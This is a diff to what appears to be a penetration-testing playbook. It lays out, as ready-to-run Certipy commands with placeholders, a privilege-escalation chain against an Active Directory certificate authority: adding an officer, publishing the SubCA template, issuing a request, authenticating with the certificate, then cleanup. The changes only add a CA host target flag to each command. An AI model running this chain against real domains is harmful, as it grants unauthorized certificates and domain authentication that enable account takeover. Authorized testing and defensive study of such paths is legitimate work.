@@ -235,19 +235,19 @@ Record the original officers and published templates before changing either.
 
 ```bash
 certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
-certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -list-templates
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -list-templates
 ```
 
 If required, add your controlled account as an officer:
 
 ```bash
-certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -add-officer '{{USER}}'
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -add-officer '{{USER}}'
 ```
 
 Publish SubCA only if needed for the verified path:
 
 ```bash
-certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -enable-template SubCA
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -enable-template SubCA
 ```
 
 Submit the request. A denied request can still have a Request ID. **Save its
@@ -260,7 +260,7 @@ certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA
 Approve the recorded request, not an invented or another user's ID:
 
 ```bash
-certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -issue-request '{{REQUEST_ID}}'
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -issue-request '{{REQUEST_ID}}'
 ```
 
 Retrieve it with its retained private key. Certipy looks for the matching
@@ -279,13 +279,13 @@ certipy auth -pfx '{{PFX_PATH}}' -dc-ip '{{DC}}'
 If the workflow added the officer, remove that added role after use:
 
 ```bash
-certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -remove-officer '{{USER}}'
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -remove-officer '{{USER}}'
 ```
 
 If it enabled SubCA, restore its prior unpublished state separately:
 
 ```bash
-certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -disable-template SubCA
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -disable-template SubCA
 ```
 
 Restoring roles/templates does not revoke an issued certificate. Record issuance,
